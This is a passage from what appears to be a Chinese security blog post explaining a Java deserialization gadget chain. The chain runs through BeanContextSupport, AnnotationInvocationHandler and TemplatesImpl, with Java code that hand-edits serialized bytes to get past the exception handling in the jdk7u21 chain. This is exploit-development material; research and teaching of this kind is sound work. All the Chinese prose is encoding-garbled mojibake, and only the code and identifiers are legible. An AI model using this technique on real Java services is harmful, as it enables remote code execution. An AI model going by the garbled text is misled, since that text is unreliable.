srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>readChildrenè°ƒç”¨å­å‡½æ•°readObjectï¼Œä¸”è¿‡ç¨‹ä¸­æœ‰æ•æ‰åˆ°äº†å¼‚å¸¸ç”¨continueè·³è¿‡ï¼Œä¸‹é¢çš„ä»£ç ï¼ˆå¼ºè½¬ï¼Œè°ƒç”¨å‡½æ•°ï¼‰å‡æ²¡æœ‰throwå¼‚å¸¸</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917105208765.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917105208765.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚ä½•ç”¨BeanContextSupport.readObjectè§¦å‘AnnotationInvocationHandler.readObjectå‘¢ï¼Ÿä¹‹å‰æˆ‘ä»¬æ„é€ çš„ååºåˆ—åŒ–é“¾éƒ½æ˜¯åˆ©ç”¨defaultReadObjectååºåˆ—åŒ–å­—æ®µï¼Œå­—æ®µä¸ºå¯¹è±¡è¿›è€Œé“¾å¼è§¦å‘readObject</p><p>ä½†æ˜¯BeanContextSupport.readObjectçš„defaultReadObject()ä¸åœ¨readChildrenå†…ï¼Œå³ä½¿è®¾ç½®å­—æ®µä¸ºAnnotationInvocationHandlerå¯¹è±¡ä¾æ—§ä¼šcatchå¼‚å¸¸ã€‚ï¼ˆæ›´åˆ«è¯´è¯¥ç±»æ ¹æœ¬æ²¡æœ‰èƒ½å­˜å‚¨HashSetå¯¹è±¡çš„étransientå­—æ®µ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917181633067.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917181633067.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£è¯¥æ€ä¹ˆè§¦å‘BeanContextSupport.readChildren-&gt;AnnotationInvocationHandler.readObject?</p><h2 id="SerializationDumper"><a href="#SerializationDumper" class="headerlink" title="SerializationDumper"></a>SerializationDumper</h2><p>ä»‹ç»ä¸€ä¸ªå·¥å…·SerializationDumper</p><p><a href="https://github.com/NickstaDB/SerializationDumper">https://github.com/NickstaDB/SerializationDumper</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Usage1:java -jar SerializationDumper-v1<span class="number">.1</span>.jar -r out.bin</span><br><span class="line">Usage2:java -jar SerializationDumper-v1<span class="number">.1</span>.jar <span class="string">&quot;aced...&quot;</span></span><br></pre></td></tr></table></figure><blockquote><h5 id="å¼•ç”¨æœºåˆ¶"><a href="#å¼•ç”¨æœºåˆ¶" class="headerlink" title="å¼•ç”¨æœºåˆ¶"></a>å¼•ç”¨æœºåˆ¶</h5><p>åœ¨åºåˆ—åŒ–æµç¨‹ä¸­ï¼Œå¯¹è±¡æ‰€å±ç±»ã€å¯¹è±¡æˆå‘˜å±æ€§ç­‰æ•°æ®éƒ½ä¼šè¢«ä½¿ç”¨å›ºå®šçš„è¯­æ³•å†™å…¥åˆ°åºåˆ—åŒ–æ•°æ®ï¼Œå¹¶ä¸”ä¼šè¢«ç‰¹å®šçš„æ–¹æ³•è¯»å–ï¼›åœ¨åºåˆ—åŒ–æ•°æ®ä¸­ï¼Œå­˜åœ¨çš„å¯¹è±¡æœ‰nullã€new objectsã€classesã€arraysã€stringsã€back referencesç­‰ï¼Œè¿™äº›å¯¹è±¡åœ¨åºåˆ—åŒ–ç»“æ„ä¸­éƒ½æœ‰å¯¹åº”çš„æè¿°ä¿¡æ¯ï¼Œå¹¶ä¸”æ¯ä¸€ä¸ªå†™å…¥å­—èŠ‚æµçš„å¯¹è±¡éƒ½ä¼šè¢«èµ‹äºˆå¼•ç”¨<code>Handle</code>ï¼Œå¹¶ä¸”è¿™ä¸ªå¼•ç”¨<code>Handle</code>å¯ä»¥åå‘å¼•ç”¨è¯¥å¯¹è±¡ï¼ˆä½¿ç”¨<code>TC_REFERENCE</code>ç»“æ„ï¼Œå¼•ç”¨å‰é¢handleçš„å€¼ï¼‰ï¼Œå¼•ç”¨<code>Handle</code>ä¼šä»<code>0x7E0000</code>å¼€å§‹è¿›è¡Œé¡ºåºèµ‹å€¼å¹¶ä¸”è‡ªåŠ¨è‡ªå¢ï¼Œä¸€æ—¦å­—èŠ‚æµå‘ç”Ÿäº†é‡ç½®åˆ™è¯¥å¼•ç”¨Handleä¼šé‡æ–°ä»<code>0x7E0000</code>å¼€å§‹ã€‚</p><h5 id="æˆå‘˜æŠ›å¼ƒ"><a href="#æˆå‘˜æŠ›å¼ƒ" class="headerlink" title="æˆå‘˜æŠ›å¼ƒ"></a>æˆå‘˜æŠ›å¼ƒ</h5><p>åœ¨ååºåˆ—åŒ–ä¸­ï¼Œå¦‚æœå½“å‰è¿™ä¸ªå¯¹è±¡ä¸­çš„æŸä¸ªå­—æ®µå¹¶æ²¡æœ‰åœ¨å­—èŠ‚æµä¸­å‡ºç°ï¼Œåˆ™è¿™äº›å­—æ®µä¼šä½¿ç”¨ç±»ä¸­å®šä¹‰çš„é»˜è®¤å€¼ï¼Œ<strong>å¦‚æœè¿™ä¸ªå€¼å‡ºç°åœ¨å­—èŠ‚æµä¸­ï¼Œä½†æ˜¯å¹¶ä¸å±äºå¯¹è±¡ï¼Œåˆ™æŠ›å¼ƒè¯¥å€¼ï¼Œä½†æ˜¯å¦‚æœè¿™ä¸ªå€¼æ˜¯ä¸€ä¸ªå¯¹è±¡çš„è¯ï¼Œé‚£ä¹ˆä¼šä¸ºè¿™ä¸ªå€¼åˆ†é…ä¸€ä¸ª Handleã€‚</strong></p></blockquote><p>å¦‚æœè°ƒç”¨ä¸¤æ¬¡writeObjectè¿›è¡Œåºåˆ—åŒ–å†™å…¥ï¼Œç›¸æ¯”åªè¿›è¡Œä¸€æ¬¡<code>out.writeObject(t);</code>ï¼Œç”¨SerializationDumperåˆ†æå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">100L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream input)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        input.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;testcase&quot;</span>));</span><br><span class="line">        out.writeObject(t);</span><br><span class="line">        out.writeObject(t); <span class="comment">//äºŒæ¬¡åºåˆ—åŒ–</span></span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„binæ–‡ä»¶è¦ç”¨-rå‚æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917170245017.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917170245017.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åºåˆ—åŒ–ä¸¤æ¬¡çš„ä¼šåœ¨åº•éƒ¨å¤šå‡ºTC_REFERENCEå—</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917170643117.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917170643117.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åç§»ä¸º0x71ï¼Œè¿™å°±æ˜¯ä¹‹å‰æåˆ°çš„</p><blockquote><p>æ¯ä¸€ä¸ªå†™å…¥å­—èŠ‚æµçš„å¯¹è±¡éƒ½ä¼šè¢«èµ‹äºˆå¼•ç”¨<code>Handle</code>ï¼Œå¹¶ä¸”è¿™ä¸ªå¼•ç”¨<code>Handle</code>å¯ä»¥åå‘å¼•ç”¨è¯¥å¯¹è±¡ï¼ˆä½¿ç”¨<code>TC_REFERENCE</code>ç»“æ„ï¼Œå¼•ç”¨å‰é¢handleçš„å€¼ï¼‰ï¼Œå¼•ç”¨<code>Handle</code>ä¼šä»<code>0x7E0000</code>å¼€å§‹è¿›è¡Œé¡ºåºèµ‹å€¼å¹¶ä¸”è‡ªåŠ¨è‡ªå¢ï¼Œä¸€æ—¦å­—èŠ‚æµå‘ç”Ÿäº†é‡ç½®åˆ™è¯¥å¼•ç”¨Handleä¼šé‡æ–°ä»<code>0x7E0000</code>å¼€å§‹ã€‚</p></blockquote><p>ObjectInputStreamåºåˆ—åŒ–æµç¨‹ä¸­ï¼ŒreadObjectè°ƒç”¨readObject0</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917172448599.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917172448599.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>readObject0è®°å½•äº†å„ä¸ªå—çš„å¤„ç†æ–¹å¼ï¼Œå…¶ä¸­TC_REFERENCEç”¨readHandleå¤„ç†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917172600429.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917172600429.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>readHandleè°ƒç”¨handles.lookupObjectè¿”å›å¼•ç”¨å¯¹è±¡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917172656187.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917172656187.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å³ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œä¼šè¿˜åŸTC_REFERENCEå¼•ç”¨çš„handleå¯¹è±¡</p><p>TC_REFERENCEä¸­å­˜æ”¾çš„æ˜¯å¯¹è±¡çš„å¼•ç”¨ï¼Œå¯¹è±¡çœŸæ­£çš„å†…å®¹å­˜åœ¨å“ªå‘¢?</p><p>ç­”æ¡ˆæ˜¯objectAnnotationå—</p><p>ç”¨ä»¥ä¸‹ä»£ç åšä¸ªä¾‹å­ï¼Œç”¨writeObjectå†™å…¥â€Pandaâ€å’Œâ€This is a test data!â€çš„UTF</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">100L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream input)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        input.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream output)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        output.defaultWriteObject();</span><br><span class="line">        output.writeObject(<span class="string">&quot;Panda&quot;</span>);</span><br><span class="line">        output.writeUTF(<span class="string">&quot;This is a test data!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;testcase_new&quot;</span>));</span><br><span class="line">        out.writeObject(t);</span><br><span class="line">        out.writeObject(t);</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å’Œä¸Šä¸€ä»½test2å¯¹æ¯”åºåˆ—åŒ–å†…å®¹ï¼Œå¤šå‡ºäº†classDescFlagså’ŒobjectAnnotations</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917185752469.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917185752469.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><ul><li><p>å¦‚æœä¸€ä¸ªå¯åºåˆ—åŒ–çš„ç±»é‡å†™äº†<code>writeObject</code>æ–¹æ³•ï¼Œè€Œä¸”å‘å­—èŠ‚æµå†™å…¥äº†ä¸€äº›é¢å¤–çš„æ•°æ®ï¼Œé‚£ä¹ˆä¼šè®¾ç½®<code>SC_WRITE_METHOD</code>æ ‡è¯†ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œä¸€èˆ¬ä½¿ç”¨ç»“æŸç¬¦<code>TC_ENDBLOCKDATA</code>æ¥æ ‡è®°è¿™ä¸ªå¯¹è±¡çš„æ•°æ®ç»“æŸï¼›</p></li><li><p>å¦‚æœä¸€ä¸ªå¯åºåˆ—åŒ–çš„ç±»é‡å†™äº†<code>writeObject</code>æ–¹æ³•ï¼Œåœ¨è¯¥åºåˆ—åŒ–æ•°æ®çš„<code>classdata</code>éƒ¨åˆ†ï¼Œè¿˜ä¼šå¤šå‡ºä¸ª<code>objectAnnotation</code>éƒ¨åˆ†ï¼Œå¹¶ä¸”å¦‚æœé‡å†™çš„<code>writeObject()</code>æ–¹æ³•å†…é™¤äº†è°ƒç”¨<code>defaultWriteObject()</code>æ–¹æ³•å†™å¯¹è±¡å­—æ®µæ•°æ®ï¼Œè¿˜å‘å­—èŠ‚æµä¸­å†™å…¥äº†è‡ªå®šä¹‰æ•°æ®ï¼Œé‚£ä¹ˆåœ¨<code>objectAnnotation</code>éƒ¨åˆ†ä¼šæœ‰å†™å…¥è‡ªå®šä¹‰æ•°æ®å¯¹åº”çš„ç»“æ„å’Œå€¼ï¼›</p></li></ul><p><code>ObjectAnnotation</code>ç»“æ„ä¸€èˆ¬ç”±<code>TC_ENDBLOCKDATA - 0x78</code> æ ‡è®°ç»“å°¾</p><p>è¿™ä¸ªcaseå¯ä»¥é¡ºåˆ©ååºåˆ—åŒ–ï¼Œå› ä¸ºæ²¡æœ‰ç‰¹æ®Šç»“æ„çš„æ•°æ®</p><p>ä¸‹é¢è¿™ä¸ªcaseèƒ½ååºåˆ—åŒ–å—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">100L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream input)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        input.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream output)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        output.defaultWriteObject();</span><br><span class="line">        <span class="type">LinkedHashSet</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>();</span><br><span class="line">        set.add(<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        output.writeObject(set);</span><br><span class="line">        output.writeObject(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        output.writeObject(<span class="string">&quot;ccc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;testcase_new&quot;</span>));</span><br><span class="line">        out.writeObject(t);</span><br><span class="line">        out.writeObject(t);</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸èƒ½ï¼Œå¯¹æ¯”ä»¥ä¸‹å’Œä¸‰ä¸ªæ­£å¸¸çš„addæœ‰ä»€ä¹ˆåŒºåˆ«ï¼š</p><p>å·¦è¾¹æ˜¯addä¸‰æ¬¡ï¼Œå³è¾¹æ˜¯addä¸€æ¬¡ï¼ŒwriteObjectä¸¤æ¬¡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917202346738.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917202346738.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ï¼ˆåé¢æœ‰0xâ€¦æ‰æ˜¯çœŸå®æœ‰è¿›åˆ¶æ•°æ®çš„ï¼Œå…¶ä»–çš„æ˜¯æè¿°ç¬¦ï¼Œæ¯”å¦‚valuesè¿™äº›å¯ä»¥å¿½ç•¥</p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªå·®åˆ«</p><ul><li><code>Contents</code>å€¼ï¼Œä¹Ÿå°±æ˜¯LinkedHashSetå…ƒç´ ä¸ªæ•°</li><li><code>ObjectAnntation</code>ç»“æŸç¬¦<code>TC_ENDBLOCKDATA</code>æ ‡è®°çš„ä½ç½®ã€‚writeObjectè¿›æ•°æ®çš„ç‰ˆæœ¬<code>TC_ENDBLOCKDATA</code>æå‰ç»“æŸäº†</li></ul><p>ä¿®æ”¹ä¸Šé¢ä¸¤ä¸ªå·®åˆ«</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">test</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">test</span>();</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;testcase_new&quot;</span>));</span><br><span class="line">    out.writeObject(t);</span><br><span class="line">    out.writeObject(t);</span><br><span class="line">    out.close();</span><br><span class="line">    <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;testcase_new&quot;</span>));</span><br><span class="line">    bytes[<span class="number">89</span>] = <span class="number">3</span>;<span class="comment">//ä¿®æ”¹hashsetçš„é•¿åº¦ï¼ˆå…ƒç´ ä¸ªæ•°ï¼‰</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(bytes[i] == <span class="number">97</span> &amp;&amp; bytes[i+<span class="number">1</span>] == <span class="number">97</span> &amp;&amp; bytes[i+<span class="number">2</span>] == <span class="number">97</span>)&#123;</span><br><span class="line">            bytes = Util.deleteAt(bytes, i + <span class="number">3</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="comment">//è°ƒæ•´TC_ENDBLOCKDATAæ ‡è®°çš„ä½ç½®</span></span><br><span class="line">    bytes = Util.addAtLast(bytes, (<span class="type">byte</span>) <span class="number">0x78</span>);</span><br><span class="line">    writeBinaryFile(<span class="string">&quot;testcase_new&quot;</span>, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Util</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] deleteAt(<span class="type">byte</span>[] array, <span class="type">int</span> index) &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt;= array.length) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IndexOutOfBoundsException</span>(<span class="string">&quot;Index out of bounds: &quot;</span> + index);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[array.length - <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(array, <span class="number">0</span>, result, <span class="number">0</span>, index);</span><br><span class="line">        System.arraycopy(array, index + <span class="number">1</span>, result, index, array.length - index - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] addAtLast(<span class="type">byte</span>[] array, <span class="type">byte</span> value) &#123;</span><br><span class="line">        <span class="type">byte</span>[] result = <span class="keyword">new</span> <span class="title class_">byte</span>[array.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(array, <span class="number">0</span>, result, <span class="number">0</span>, array.length);</span><br><span class="line">        result[array.length] = value;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„æ–‡ä»¶ä¸€æ ·ã€‚è¿™ä¸ªæ”¹äº†<code>Contents</code>å’Œ<code>TC_ENDBLOCKDATA</code>çš„åºåˆ—åŒ–æ–‡ä»¶å°±èƒ½è¿›è¡Œååºåˆ—åŒ–</p><p>è¯¥åœ¨å“ªæ’å…¥BeanContextSupportå‘¢ï¼Ÿ</p><p>jdk7u21çš„é“¾ä»LinkedHashSetå¼€å§‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LinkedHashSet.add()</span><br><span class="line">HashSet.readObject -&gt;</span><br><span class="line">HashMap.put -&gt;</span><br><span class="line">AnnotationInvocationHandler.invoke-&gt; hashCodeImpl -&gt;</span><br><span class="line">AnnotationInvocationHandler.invoke-&gt; equalsImpl -&gt;</span><br><span class="line">TemplatesImpl.newTransformer</span><br></pre></td></tr></table></figure><p>AnnotationInvocationHandler.readObjectæŠ›å‡ºçš„å¼‚å¸¸å¿…é¡»ç”±BeanContextSupportç›´æ¥æ¥æ”¶ï¼Œä¸ç„¶æŠ›å‡ºåˆ°LinkedHashSetæˆ–è€…HashMapéƒ½ä¼šç›´æ¥ä¸­æ­¢ç¨‹åºå¹¶æŠ¥çº¢é”™ã€‚</p><p>æˆ‘ä»¬åœ¨ä¸€å¼€å§‹çš„LinkedHashSetå°±å¼ºåˆ¶è®¾ç½®ä¸€ä¸ªå­—æ®µä¸ºBeanContextSupportï¼ˆåŒ…å«äº†éœ€è¦åˆå§‹åŒ–çš„AnnotationInvocationHandlerå¯¹è±¡ï¼‰ã€‚è¿™æ ·åœ¨HashSet.readObjectä¸€å¼€å§‹å°±èƒ½åˆå§‹åŒ–Annoå¯¹è±¡ï¼ˆè§¦å‘å®ŒAnno.readObject)ï¼Œåé¢å°±ä¸ä¼šæŠ¥é”™äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917200003151.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240917200003151.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯çºµè§‚HashSetï¼Œä¸€ä¸ªtransientï¼Œä¸€ä¸ªstatic finalï¼Œæ²¡æœ‰ä¸€ä¸ªå­—æ®µå¯ä»¥å¼ºè¡Œè®¾ç½®ï¼Œåªæœ‰è°ƒç”¨addå‘HashMapè£…å¡«BeanContextSupport</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240918150224374.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240918150224374.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å°±åˆ©ç”¨åˆ°äº†ä¸Šé¢ä¿®æ”¹Contentså’ŒTC_REFERENCEå­—æ®µçš„caseäº†</p><p>payloadç›´æ¥æŠ„ï¼Œä»¥åä¹Ÿç”¨ä¸åˆ°è‡ªå·±å†™çš„</p><p><a 